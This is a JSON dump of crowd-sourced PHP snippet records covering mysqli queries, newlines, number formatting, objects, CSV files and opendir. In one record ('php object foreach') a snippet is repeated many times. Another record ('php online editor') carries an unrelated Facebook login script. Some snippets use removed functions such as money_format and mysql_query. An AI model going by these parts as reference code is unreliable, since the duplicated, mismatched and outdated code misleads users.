    "description": "$mysqli = new mysqli(\"host\", \"user\", \"password\", \"database\", 'port', 'socket');  $result = $mysqli->query(\"SELECT Name, Type, Color FROM Fruit\");  /**  * This optional parameter is a constant indicating what type of array should  * be produced from the current row data. The possible values for this parameter  * are the constants MYSQLI_ASSOC, MYSQLI_NUM, or MYSQLI_BOTH.  */ $rows = $result->fetch_all(MYSQLI_ASSOC);  foreach ($rows as $row) {   printf(\"%s - %s - %s\\n\", $row[\"Name\"], $row[\"Type\"], $row[\"Color\"]); }\n",
    "reg_date": "2021-10-12T10:18:50.000Z"
  },
  {
    "id": 3918,
    "keyword": null,
    "link": null,
    "title": " php mysqli fetch single row",
    "description": "$row = $result->fetch_assoc();\n",
    "reg_date": "2021-10-12T10:18:50.000Z"
  },
  {
    "id": 3919,
    "keyword": null,
    "link": null,
    "title": " php mysqli number row",
    "description": "<?php  /* Explination  The mysqli_num_rows() function is an inbuilt function in PHP  which is used to return the number of rows present in the result set.  It is generally used to check if data is present in the database or not.  To use this function, it is mandatory to first set up the connection with the MySQL database. */ \t// Setting up connection with database Geeks  \t$con = mysqli_connect(\"localhost\", \"root\", \"\", \"testing\");  \t \t// Check connection  \tif (mysqli_connect_errno()) {  \t\techo \"Database connection failed.\";  \t}  \t// Fetch Query \t$query = \"SELECT Username, Password FROM users\";  \t \t// Execute the query and store the result set  \t$result = mysqli_query($con, $query);  \t \tif ($result) {  \t\t// it return number of rows in the table.  \t\t$row = mysqli_num_rows($result);  \t\tif ($row) {  \t\t\t \tprintf(\"Number of row in the table : \" . $row);  \t\t\t}  \t\t// close the result.  \t\tmysqli_free_result($result);  \t}   // Output : Number of row in the table : 5 ?>  \nmysqli_num_rows($result);\n<?php mysqli_num_rows($result); ?>\n",
    "reg_date": "2021-10-12T10:18:50.000Z"
  },
  {
    "id": 3920,
    "keyword": null,
    "link": null,
    "title": " php needle haystack",
    "description": "//Find the position of the first occurrence of a substring in a string $mystring = 'abc'; $findme   = 'a'; $pos = strpos($mystring, $findme);\n",
    "reg_date": "2021-10-12T10:18:50.000Z"
  },
  {
    "id": 3921,
    "keyword": null,
    "link": null,
    "title": " php nested array contains",
    "description": "in_array($search, array_column($array, 'name'))\n",
    "reg_date": "2021-10-12T10:18:50.000Z"
  },
  {
    "id": 3922,
    "keyword": null,
    "link": null,
    "title": " php nested ternary operator",
    "description": "// The below statement is an exaple of the nested ternary operator in PHP echo ($row[\"position\"] != \"NA\") ? $row[\"position\"] :  (($row[\"current_degree\"] != \"NA\") ? $row[\"current_degree\"] :   $row[\"qualification\"]);  // The equivalent if else structure is given below  if ($row[\"position\"] != \"NA\"){   echo $row[\"position\"]; } elseif($row[\"current_degree\"] != \"NA\"){   echo $row[\"current_degree\"]; } else{   echo $row[\"qualification\"]; }\n",
    "reg_date": "2021-10-12T10:18:50.000Z"
  },
  {
    "id": 3923,
    "keyword": null,
    "link": null,
    "title": " php new line",
    "description": "<?php echo \"If you view the page source \\r\\n you will find a newline in this string.\"; echo \"<br>\"; echo nl2br(\"You will find the \\n newlines in this string \\r\\n on the browser window.\"); ?>   // 2 Way   <?php echo $clientid, ' ', $lastname, PHP_EOL;?>\n<?php echo \"Hello world this is example \\r\\n in php.\"; echo \"<br>\"; echo nl2br(\"You will find the \\n newlines in this string \\r\\n on the browser window.\"); ?>\n\"\\r\\n\"\necho \"\\n\";\nreturn nl2br(\"This is the cointracker sample text.\\nThis should be line 2!\");\n//let a variable contain multiple line //add <br> tag in string $variable = \"123 <br> \";\n",
    "reg_date": "2021-10-12T10:18:50.000Z"
  },
  {
    "id": 3924,
    "keyword": null,
    "link": null,
    "title": " php new object",
    "description": "$x = (object) [     'a' => 'test',     'b' => 'test2',     'c' => 'test3' ]; var_dump($x);  /* object(stdClass)#1 (3) {   [\"a\"]=>   string(4) \"test\"   [\"b\"]=>   string(5) \"test2\"   [\"c\"]=>   string(5) \"test3\" } */\n   $object = new stdClass();    $object->property = 'Here we go';     var_dump($object);    /*    outputs:     object(stdClass)#2 (1) {       [\"property\"]=>       string(10) \"Here we go\"     }    */\n//object init   $object = (object) [     'propertyOne' => 'foo',     'propertyTwo' => 42,   ];\n By far the easiest and correct way to instantiate an empty generic php object that you can then modify for whatever purpose you choose:    <?php $genericObject = new stdClass(); ?>    I had the most difficult time finding this, hopefully it will help someone else! \n//define a class class MyClass{   //create properties, constructor or methods }  //create object using \"new\" keyword $object = new MyClass();   //or wihtout parenthesis $object = new MyClass;\n",
    "reg_date": "2021-10-12T10:18:50.000Z"
  },
  {
    "id": 3925,
    "keyword": null,
    "link": null,
    "title": " php newline",
    "description": "<?php echo \"If you view the page source \\r\\n you will find a newline in this string.\"; echo \"<br>\"; echo nl2br(\"You will find the \\n newlines in this string \\r\\n on the browser window.\"); ?>   // 2 Way   <?php echo $clientid, ' ', $lastname, PHP_EOL;?>\n<?php echo \"Hello world this is example \\r\\n in php.\"; echo \"<br>\"; echo nl2br(\"You will find the \\n newlines in this string \\r\\n on the browser window.\"); ?>\n\"\\r\\n\"\n<?php  echo nl2br(\"If you want that '\\n' works. \\n Then use nl2br() function!\");  echo \"<br> can also be used.\";  echo \"nl2br() is in-built function whereas <br> is html tag\"; ?>\necho \"<br>\";\necho \"\\n\";\n",
    "reg_date": "2021-10-12T10:18:50.000Z"
  },
  {
    "id": 3926,
    "keyword": null,
    "link": null,
    "title": " php nombre de caractère",
    "description": " <?php $str = 'abcdef'; echo strlen($str); // 6  $str = ' ab cd '; echo strlen($str); // 7 ?>  \n",
    "reg_date": "2021-10-12T10:18:51.000Z"
  },
  {
    "id": 3927,
    "keyword": null,
    "link": null,
    "title": " php nombre de jours entre deux dates",
    "description": "<?php   // On transforme les 2 dates en timestamp $date1 = strtotime($date1); $date2 = strtotime($date2);   // On r&eacute;cup&egrave;re la diff&eacute;rence de timestamp entre les 2 pr&eacute;c&eacute;dents $nbJoursTimestamp = $date2 - $date1;   // ** Pour convertir le timestamp (exprim&eacute; en secondes) en jours ** // On sait que 1 heure = 60 secondes * 60 minutes et que 1 jour = 24 heures donc : $nbJours = $nbJoursTimestamp/86400; // 86 400 = 60*60*24   echo \"Nombre de jours : \".$nbJours;   ?>\n",
    "reg_date": "2021-10-12T10:18:51.000Z"
  },
  {
    "id": 3928,
    "keyword": null,
    "link": null,
    "title": " php not display notice",
    "description": "// Report all errors except E_NOTICE    error_reporting(E_ALL ^ E_NOTICE);   \n",
    "reg_date": "2021-10-12T10:18:51.000Z"
  },
  {
    "id": 3929,
    "keyword": null,
    "link": null,
    "title": " php now",
    "description": "$today = date(\"F j, Y, g:i a\");   // October 30, 2019, 10:42 pm $today = date(\"D M j G:i:s T Y\"); // Wed Oct 30 22:42:18 UTC 2019 $today = date(\"Y-m-d H:i:s\");     // 2019-10-30 22:42:18(MySQL DATETIME format)\ndate('Y-m-d H:i:s')\n//Get current date time in PHP  // Simply: $date = date('Y-m-d H:i:s');  // Or: $date = date('Y/m/d H:i:s');  // This would return the date in the following formats respectively: $date = '2012-03-06 17:33:07'; // Or $date = '2012/03/06 17:33:07';  /**   * This time is based on the default server time zone.  * If you want the date in a different time zone,  * say if you come from Nairobi, Kenya like I do, you can set  * the time zone to Nairobi as shown below.  */  date_default_timezone_set('Africa/Nairobi');  // Then call the date functions $date = date('Y-m-d H:i:s'); // Or $date = date('Y/m/d H:i:s');  // date_default_timezone_set() function is however // supported by PHP version 5.1.0 or above. \n<?php   // To change the format of an existing date   $old_date_format = \"20/03/1999\";   $new_data_format = date(\"Y-m-d H:i:s\", strtotime($old_date_format));\ndate(\"Y-m-d H:i:s\"); \n// In my case I want to print to log my zone time (Rome GMT +2) // without changing the default timezone // Add +2 hours respect to php time $new_time = date(\"Y-m-d H:i:s\", strtotime('+2 hours'));\n",
    "reg_date": "2021-10-12T10:18:51.000Z"
  },
  {
    "id": 3930,
    "keyword": null,
    "link": null,
    "title": " php null",
    "description": "// The is_null() function checks whether a variable is NULL or not. This function returns true (1) if the variable is NULL, otherwise it returns false/nothing.  <?php     $var = NULL;   \tif (is_null($var)) {       \techo \"yes, is null\";            } else {       \techo \"not null\";     } ?>   \nis_null($foo)\n<?php    \t$var = NULL;    ?>\nis_null (var_name)\nis_null($var)\n$var = NULL;\n",
    "reg_date": "2021-10-12T10:18:51.000Z"
  },
  {
    "id": 3931,
    "keyword": null,
    "link": null,
    "title": " php num rows",
    "description": "mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT); $link = mysqli_connect(\"host\", \"username\", \"password\",\"db_name\"); mysqli_set_charset($link, \"utf8mb4\");  $result = mysqli_query($link, \"SELECT count(*) FROM blackandwhite\"); $num_rows = mysqli_fetch_row($result)[0];  echo \"$num_rows Rows\\n\"; \n<?php  /* Explination  The mysqli_num_rows() function is an inbuilt function in PHP  which is used to return the number of rows present in the result set.  It is generally used to check if data is present in the database or not.  To use this function, it is mandatory to first set up the connection with the MySQL database. */ \t// Setting up connection with database Geeks  \t$con = mysqli_connect(\"localhost\", \"root\", \"\", \"testing\");  \t \t// Check connection  \tif (mysqli_connect_errno()) {  \t\techo \"Database connection failed.\";  \t}  \t// Fetch Query \t$query = \"SELECT Username, Password FROM users\";  \t \t// Execute the query and store the result set  \t$result = mysqli_query($con, $query);  \t \tif ($result) {  \t\t// it return number of rows in the table.  \t\t$row = mysqli_num_rows($result);  \t\tif ($row) {  \t\t\t \tprintf(\"Number of row in the table : \" . $row);  \t\t\t}  \t\t// close the result.  \t\tmysqli_free_result($result);  \t}   // Output : Number of row in the table : 5 ?>  \n// Fetch Query $query = \"SELECT user_name from registered_users where user_name like '%ank%'\";   // Execute the query and store the result set  $result = mysqli_query($con, $query);   if ($result) {    // it return number of rows in the table.    $row = mysqli_num_rows($result);  }\n",
    "reg_date": "2021-10-12T10:18:51.000Z"
  },
  {
    "id": 3932,
    "keyword": null,
    "link": null,
    "title": " php number format",
    "description": "$num = 12345.6789; echo number_format($num, 2, '.', '') //12345.67 echo number_format($num, 3, ',', '.') //12.345,678\n<?php echo number_format(\"1000000\").\"<br>\"; echo number_format(\"1000000\",2).\"<br>\"; echo number_format(\"1000000\",2,\",\",\".\"); ?>\n// string number_format ($number, $decimals, $decimalpoint, $seperator)  // Enter the number you wish to format using decimals // to set the number of decimal places // You can replace the '.' with your own string // with the decimalpoint parameter. // With seperator, you can specify a string to be used // to seperate thousands.  $num = 123456.789; echo number_format($num); // 123,456 echo number_format($num, 4); // 123,456.7890 echo number_format($num, 4, '#'); // 123,456#7890 echo number_format($num, 5, '#', 'T'); // 123T456#78900\n $num = 12345.6789; echo number_format($num, 2, '.', '') //12345.67 echo number_format($num, 3, ',', '.') //12.345,678\n",
    "reg_date": "2021-10-12T10:18:51.000Z"
  },
  {
    "id": 3933,
    "keyword": null,
    "link": null,
    "title": " php number format 2 decimal no comma",
    "description": "number_format(1000.5, 2, '.', '');\n",
    "reg_date": "2021-10-12T10:18:52.000Z"
  },
  {
    "id": 3934,
    "keyword": null,
    "link": null,
    "title": " php number format spaces",
    "description": "echo number_format($number, 2, ',', ' '); \n",
    "reg_date": "2021-10-12T10:18:52.000Z"
  },
  {
    "id": 3935,
    "keyword": null,
    "link": null,
    "title": " php number padding",
    "description": " <?php $input = \"Alien\"; echo str_pad($input, 10);                      // produces \"Alien     \" echo str_pad($input, 10, \"-=\", STR_PAD_LEFT);  // produces \"-=-=-Alien\" echo str_pad($input, 10, \"_\", STR_PAD_BOTH);   // produces \"__Alien___\" echo str_pad($input,  6, \"___\");               // produces \"Alien_\" echo str_pad($input,  3, \"*\");                 // produces \"Alien\" ?>  \n",
    "reg_date": "2021-10-12T10:18:52.000Z"
  },
  {
    "id": 3936,
    "keyword": null,
    "link": null,
    "title": " php number to words",
    "description": "//This if function to convert numbers to Indian Currency  function getIndianCurrency(float $number) {     $decimal = round($number - ($no = floor($number)), 2) * 100;     $hundred = null;     $digits_length = strlen($no);     $i = 0;     $str = array();     $words = array(0 => '', 1 => 'one', 2 => 'two',         3 => 'three', 4 => 'four', 5 => 'five', 6 => 'six',         7 => 'seven', 8 => 'eight', 9 => 'nine',         10 => 'ten', 11 => 'eleven', 12 => 'twelve',         13 => 'thirteen', 14 => 'fourteen', 15 => 'fifteen',         16 => 'sixteen', 17 => 'seventeen', 18 => 'eighteen',         19 => 'nineteen', 20 => 'twenty', 30 => 'thirty',         40 => 'forty', 50 => 'fifty', 60 => 'sixty',         70 => 'seventy', 80 => 'eighty', 90 => 'ninety');     $digits = array('', 'hundred','thousand','lakh', 'crore');     while( $i < $digits_length ) {         $divider = ($i == 2) ? 10 : 100;         $number = floor($no % $divider);         $no = floor($no / $divider);         $i += $divider == 10 ? 1 : 2;         if ($number) {             $plural = (($counter = count($str)) && $number > 9) ? 's' : null;             $hundred = ($counter == 1 && $str[0]) ? ' and ' : null;             $str [] = ($number < 21) ? $words[$number].' '. $digits[$counter]. $plural.' '.$hundred:$words[floor($number / 10) * 10].' '.$words[$number % 10]. ' '.$digits[$counter].$plural.' '.$hundred;         } else $str[] = null;     }     $Rupees = implode('', array_reverse($str));     $paise = ($decimal > 0) ? \".\" . ($words[$decimal / 10] . \" \" . $words[$decimal % 10]) . ' Paise' : '';     return ($Rupees ? $Rupees . 'Rupees ' : '') . $paise; }\n",
    "reg_date": "2021-10-12T10:18:52.000Z"
  },
  {
    "id": 3937,
    "keyword": null,
    "link": null,
    "title": " php numberformatter currency without symbol",
    "description": "// change symbol to whatever you want, nothing to no-symbol $fmt = new NumberFormatter('en_GB',  NumberFormatter::CURRENCY); $fmt->setSymbol(NumberFormatter::CURRENCY_SYMBOL, ''); echo $fmt->formatCurrency($price, 'EUR');\n <?php  $number = 1234.56;  // let's print the international format for the en_US locale setlocale(LC_MONETARY, 'en_US'); echo money_format('%i', $number) . \"\\n\"; // USD 1,234.56  // Italian national format with 2 decimals` setlocale(LC_MONETARY, 'it_IT'); echo money_format('%.2n', $number) . \"\\n\"; // Eu 1.234,56  // Using a negative number $number = -1234.5672;  // US national format, using () for negative numbers // and 10 digits for left precision setlocale(LC_MONETARY, 'en_US'); echo money_format('%(#10n', $number) . \"\\n\"; // ($        1,234.57)  // Similar format as above, adding the use of 2 digits of right // precision and '*' as a fill character echo money_format('%=*(#10.2n', $number) . \"\\n\"; // ($********1,234.57)  // Let's justify to the left, with 14 positions of width, 8 digits of // left precision, 2 of right precision, without the grouping character // and using the international format for the de_DE locale. setlocale(LC_MONETARY, 'de_DE'); echo money_format('%=*^-14#8.2i', 1234.56) . \"\\n\"; // Eu 1234,56****  // Let's add some blurb before and after the conversion specification setlocale(LC_MONETARY, 'en_GB'); $fmt = 'The final value is %i (after a 10%% discount)'; echo money_format($fmt, 1234.56) . \"\\n\"; // The final value is  GBP 1,234.56 (after a 10% discount)  ?>  \n",
    "reg_date": "2021-10-12T10:18:52.000Z"
  },
  {
    "id": 3938,
    "keyword": null,
    "link": null,
    "title": " php object(stdclass) to array",
    "description": "// The manual specifies the second argument of json_decode as: //\t assoc //\t\tWhen TRUE, returned objects will be converted into associative arrays.   $array = json_decode(json_encode($booking), true);\n$array = json_decode(json_encode($object), true); \n",
    "reg_date": "2021-10-12T10:18:52.000Z"
  },
  {
    "id": 3939,
    "keyword": null,
    "link": null,
    "title": " php object",
    "description": "$x = new stdClass();\n//create a person object in PHP  $person=new stdClass();  $person->firstName=\"Chuck\";  $person->lastName=\"Bartowski\";  $person->age=27;    print_r($person);    \n   $object = new stdClass();    $object->property = 'Here we go';     var_dump($object);    /*    outputs:     object(stdClass)#2 (1) {       [\"property\"]=>       string(10) \"Here we go\"     }    */\n<?php class Bike {     function model()     {         $model_name = 'cd100';         echo \"bike model:$model_name\";     } } $obj = new Bike(); $obj->model(); ?>\n//object init   $object = (object) [     'propertyOne' => 'foo',     'propertyTwo' => 42,   ];\n$o= new \\stdClass(); $o->a = 'new object';  OR  $o = (object) ['a' => 'new object'];\n",
    "reg_date": "2021-10-12T10:18:53.000Z"
  },
  {
    "id": 3940,
    "keyword": null,
    "link": null,
    "title": " php object check if property exists",
    "description": "if(property_exists($car,color)){ \t//$car->color exists }\nproperty_exists( $object , \"key1\" ); // bool\n",
    "reg_date": "2021-10-12T10:18:53.000Z"
  },
  {
    "id": 3941,
    "keyword": null,
    "link": null,
    "title": " php object example",
    "description": "$x = (object) [     'a' => 'test',     'b' => 'test2',     'c' => 'test3' ]; var_dump($x);  /* object(stdClass)#1 (3) {   [\"a\"]=>   string(4) \"test\"   [\"b\"]=>   string(5) \"test2\"   [\"c\"]=>   string(5) \"test3\" } */\n$x = new stdClass();\n//create a person object in PHP  $person=new stdClass();  $person->firstName=\"Chuck\";  $person->lastName=\"Bartowski\";  $person->age=27;    print_r($person);    \n   $object = new stdClass();    $object->property = 'Here we go';     var_dump($object);    /*    outputs:     object(stdClass)#2 (1) {       [\"property\"]=>       string(10) \"Here we go\"     }    */\n<?php class Bike {     function model()     {         $model_name = 'cd100';         echo \"bike model:$model_name\";     } } $obj = new Bike(); $obj->model(); ?>\n//object init   $object = (object) [     'propertyOne' => 'foo',     'propertyTwo' => 42,   ];\n",
    "reg_date": "2021-10-12T10:18:53.000Z"
  },
  {
    "id": 3942,
    "keyword": null,
    "link": null,
    "title": " php object foreach",
    "description": "//$arr should be array as you mentioned as below foreach($arr as $key=>$value){   echo $value->sm_id; } \n <?php class MyClass {     public $var1 = 'value 1';     public $var2 = 'value 2';     public $var3 = 'value 3';      protected $protected = 'protected var';     private   $private   = 'private var';      function iterateVisible() {        echo \"MyClass::iterateVisible:\\n\";        foreach ($this as $key => $value) {            print \"$key => $value\\n\";        }     } }  $class = new MyClass();  foreach($class as $key => $value) {     print \"$key => $value\\n\"; } echo \"\\n\";   $class->iterateVisible();  ?>  \n$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }\n",
    "reg_date": "2021-10-12T10:18:53.000Z"
  },
  {
    "id": 3943,
    "keyword": null,
    "link": null,
    "title": " php object to array",
    "description": "//This works best $array = json_decode(json_encode($object), true);\n//It is verry  easy : just cast object to array $array =  (array)$object;\n$array = (array) $yourObject;\n$person = new stdClass(); $person->firstName = \"Taylor\"; $person->age = 32;  //Convert Single-Dimention Object to array $personArray = (array) $person;  //Convert Multi-Dimentional Object to Array $personArray = objectToArray($person); function objectToArray ($object) {     if(!is_object($object) && !is_array($object)){     \treturn $object;     }     return array_map('objectToArray', (array) $object); }\n$array = (array) $object;\n<?php  class sample {             /* Member variables */     var $var1;      var $var2;             function __construct( $par1, $par2 )       {          $this->var1 = $par1;          $this->var2 = $par2;      }  }     // Creating the object  $myObj = new sample(1000, \"second\");  echo \"Before conversion: \\n\";  var_dump($myObj);     // Converting object to associative array  $myArray = json_decode(json_encode($myObj), true);  echo \"After conversion: \\n\";  var_dump($myArray);  ?>     Output: Before conversion:  object(sample)#1 (2) {   [\"var1\"]=>   int(1000)   [\"var2\"]=>   string(6) \"second\" }  After conversion:  array(2) {   [\"var1\"]=>   int(1000)   [\"var2\"]=>   string(6) \"second\" }\n",
    "reg_date": "2021-10-12T10:18:53.000Z"
  },
  {
    "id": 3944,
    "keyword": null,
    "link": null,
    "title": " php obscure string",
    "description": "/**  * @param string|string[] $plain  * @param int             $revealStart  * @param int             $revealEnd  * @param string          $obscuration  * @return string|string[]  */ function obscure(     $plain,     int $revealStart = 1,     int $revealEnd = 0,     string $obscuration = '*' ) {     if (is_array($plain)) {         return array_map(             function ($plainPart) use ($revealStart, $revealEnd, $obscuration) {                 return obscure($plainPart, $revealStart, $revealEnd, $obscuration);             },             $plain         );     }     $plain = (string) $plain;     return mb_substr($plain, 0, $revealStart)         . str_repeat(             $obscuration,             max(                 0,                 mb_strlen($plain) -                 ($revealStart + $revealEnd)             )         )         . mb_substr(             $plain,             -$revealEnd,             $revealEnd         ); }\n",
    "reg_date": "2021-10-12T10:18:53.000Z"
  },
  {
    "id": 3945,
    "keyword": null,
    "link": null,
    "title": " php odd or even",
    "description": "$num = 85; if($num % 2 == 0){ echo \"this is even number\";  }else{ echo \"this is odd number\"; } \n$num = 34; if ($num % 2 == 0) {   print \"It's even\"; }\n",
    "reg_date": "2021-10-12T10:18:53.000Z"
  },
  {
    "id": 3946,
    "keyword": null,
    "link": null,
    "title": " php ofreach",
    "description": " <?php  $a = array(1, 2, 3, 17);  foreach ($a as $index => $v) {     echo \"Current value of \\$a: $v.\\n\"; }  ?>  \n",
    "reg_date": "2021-10-12T10:18:53.000Z"
  },
  {
    "id": 3947,
    "keyword": null,
    "link": null,
    "title": " php online editor",
    "description": "Try this sites to write php code online:    http://www.writephponline.com/   http://sandbox.onlinephpfunctions.com/   https://paiza.io/en/projects/new   http://phptester.net/   https://www.tutorialspoint.com/execute_php_online.php   https://rextester.com/l/php_online_compiler   http://phpfiddle.org/   https://repl.it/languages/php_cli   https://www.jdoodle.com/php-online-editor/\nTry to use:  https://repl.it/\n/login.php   session_start(); $fb = new Facebook\\Facebook([   'app_id' => '{app-id}', // Replace {app-id} with your app id   'app_secret' => '{app-secret}',   'default_graph_version' => 'v3.2',   ]);  $helper = $fb->getRedirectLoginHelper();  $permissions = ['email']; // Optional permissions $callbackUrl = htmlspecialchars('https://example.com/fb-callback.php'); $loginUrl = $helper->getLoginUrl($callbackUrl, $permissions);  echo '<a href=\"' . $loginUrl . '\">Log in with Facebook!</a>';   /fb-callback.php   session_start(); $fb = new Facebook\\Facebook([   'app_id' => '{app-id}', // Replace {app-id} with your app id   'app_secret' => '{app-secret}',   'default_graph_version' => 'v3.2',   ]);  $helper = $fb->getRedirectLoginHelper();  try {   $accessToken = $helper->getAccessToken(); } catch(Facebook\\Exceptions\\FacebookResponseException $e) {   // When Graph returns an error   echo 'Graph returned an error: ' . $e->getMessage();   exit; } catch(Facebook\\Exceptions\\FacebookSDKException $e) {   // When validation fails or other local issues   echo 'Facebook SDK returned an error: ' . $e->getMessage();   exit; }  if (! isset($accessToken)) {   if ($helper->getError()) {     header('HTTP/1.0 401 Unauthorized');     echo \"Error: \" . $helper->getError() . \"\\n\";     echo \"Error Code: \" . $helper->getErrorCode() . \"\\n\";     echo \"Error Reason: \" . $helper->getErrorReason() . \"\\n\";     echo \"Error Description: \" . $helper->getErrorDescription() . \"\\n\";   } else {     header('HTTP/1.0 400 Bad Request');     echo 'Bad request';   }   exit; }  // Logged in echo '<h3>Access Token</h3>'; var_dump($accessToken->getValue());  // The OAuth 2.0 client handler helps us manage access tokens $oAuth2Client = $fb->getOAuth2Client();  // Get the access token metadata from /debug_token $tokenMetadata = $oAuth2Client->debugToken($accessToken); echo '<h3>Metadata</h3>'; var_dump($tokenMetadata);  // Validation (these will throw FacebookSDKException's when they fail) $tokenMetadata->validateAppId('{app-id}'); // Replace {app-id} with your app id // If you know the user ID this access token belongs to, you can validate it here //$tokenMetadata->validateUserId('123'); $tokenMetadata->validateExpiration();  if (! $accessToken->isLongLived()) {   // Exchanges a short-lived access token for a long-lived one   try {     $accessToken = $oAuth2Client->getLongLivedAccessToken($accessToken);   } catch (Facebook\\Exceptions\\FacebookSDKException $e) {     echo \"<p>Error getting long-lived access token: \" . $e->getMessage() . \"</p>\\n\\n\";     exit;   }    echo '<h3>Long-lived</h3>';   var_dump($accessToken->getValue()); }  $_SESSION['fb_access_token'] = (string) $accessToken;  // User is logged in with a long-lived access token. // You can redirect them to a members-only page. //header('Location: https://example.com/members.php');\n",
    "reg_date": "2021-10-12T10:18:53.000Z"
  },
  {
    "id": 3948,
    "keyword": null,
    "link": null,
    "title": " php only my ip",
    "description": "$myIp = ''; if ($_SERVER['REMOTE_ADDR'] == $myIp) { \t//do something }   \n",
    "reg_date": "2021-10-12T10:18:54.000Z"
  },
  {
    "id": 3949,
    "keyword": null,
    "link": null,
    "title": " php open csv",
    "description": " <?php $row = 1; if (($handle = fopen(\"test.csv\", \"r\")) !== FALSE) {     while (($data = fgetcsv($handle, 1000, \",\")) !== FALSE) {         $num = count($data);         echo \"<p> $num fields in line $row: <br /></p>\\n\";         $row++;         for ($c=0; $c < $num; $c++) {             echo $data[$c] . \"<br />\\n\";         }     }     fclose($handle); } ?>  \n    $csvFile = file('../somefile.csv');     $data = [];     foreach ($csvFile as $line) {         $data[] = str_getcsv($line);     }\n<?php ini_set('auto_detect_line_endings',TRUE); $handle = fopen('/path/to/file','r'); while ( ($data = fgetcsv($handle) ) !== FALSE ) {   //process the array in $data   var_dump($data); } ini_set('auto_detect_line_endings',FALSE);\n// output headers so that the file is downloaded rather than displayed header('Content-Type: text/csv; charset=utf-8'); header('Content-Disposition: attachment; filename=data.csv');  // create a file pointer connected to the output stream $output = fopen('php://output', 'w');  // output the column headings fputcsv($output, array('Column 1', 'Column 2', 'Column 3'));  // fetch the data mysql_connect('localhost', 'username', 'password'); mysql_select_db('database'); $rows = mysql_query('SELECT field1,field2,field3 FROM table');  // loop over the rows, outputting them while ($row = mysql_fetch_assoc($rows)) fputcsv($output, $row); \n",
    "reg_date": "2021-10-12T10:18:54.000Z"
  },
  {
    "id": 3950,
    "keyword": null,
    "link": null,
    "title": " php open file capital letters or not",
    "description": "$result = current(preg_grep(\"/\".preg_quote($filename).\"/i\", glob(\"$path/*\")));\n",
    "reg_date": "2021-10-12T10:18:54.000Z"
  },
  {
    "id": 3951,
    "keyword": null,
    "link": null,
    "title": " php opendir",
    "description": " <?php $dir = \"/etc/php5/\";  // Open a known directory, and proceed to read its contents if (is_dir($dir)) {     if ($dh = opendir($dir)) {         while (($file = readdir($dh)) !== false) {             echo \"filename: $file : filetype: \" . filetype($dir . $file) . \"\\n\";         }         closedir($dh);     } } ?>  \n",
    "reg_date": "2021-10-12T10:18:54.000Z"
  },
  {
    "id": 3952,
    "keyword": null,
    "link": null,
    "title": " php or",
    "description": "$num1 = 5; $num2 = 10; $num1 === 5 or $num2 === 6; // Shorthand $num1 === 5 || $num2 === 6;\n$a == $b\tEqual\tTRUE if $a is equal to $b after type juggling. $a === $b\tIdentical\tTRUE if $a is equal to $b, and they are of the same type. $a != $b\tNot equal\tTRUE if $a is not equal to $b after type juggling. $a <> $b\tNot equal\tTRUE if $a is not equal to $b after type juggling. $a !== $b\tNot identical\tTRUE if $a is not equal to $b, or they are not of the same type. $a < $b\tLess than\tTRUE if $a is strictly less than $b. $a > $b\tGreater than\tTRUE if $a is strictly greater than $b. $a <= $b\tLess than or equal to\tTRUE if $a is less than or equal to $b. $a >= $b\tGreater than or equal to\tTRUE if $a is greater than or equal to $b. $a <=> $b\tSpaceship\tAn integer less than, equal to, or greater than zero when $a is less than, equal to, or greater than $b, respectively. Available as of PHP 7.\nPHP =>   //The double arrow operator, =>    //Used as an access mechanism for arrays.   //The left side will have a corresponding value on the right side in array.    //This can be used to set values into a corresponding index of an array.    //The index can be a string or number. $myArray = array(     0 => 'Red',     1 => 'Orange',     2 => 'Yellow',     3 => 'Green' );\n",
    "reg_date": "2021-10-12T10:18:54.000Z"
  },
  {
    "id": 3953,
    "keyword": null,
    "link": null,
    "title": " php override trait method and call it",
    "description": "trait A {     function calc($v) {         return $v+1;     } }  class MyClass {     use A {         calc as protected traitcalc;     }      function calc($v) {         $v++;         return $this->traitcalc($v);     } }\n",
    "reg_date": "2021-10-12T10:18:54.000Z"
  },
  {
    "id": 3954,
    "keyword": null,
    "link": null,
    "title": " php pakistan time zone",
    "description": "Asia/Karachi\n",
    "reg_date": "2021-10-12T10:18:54.000Z"
  },
  {
    "id": 3955,
    "keyword": null,
    "link": null,
    "title": " php parse file",
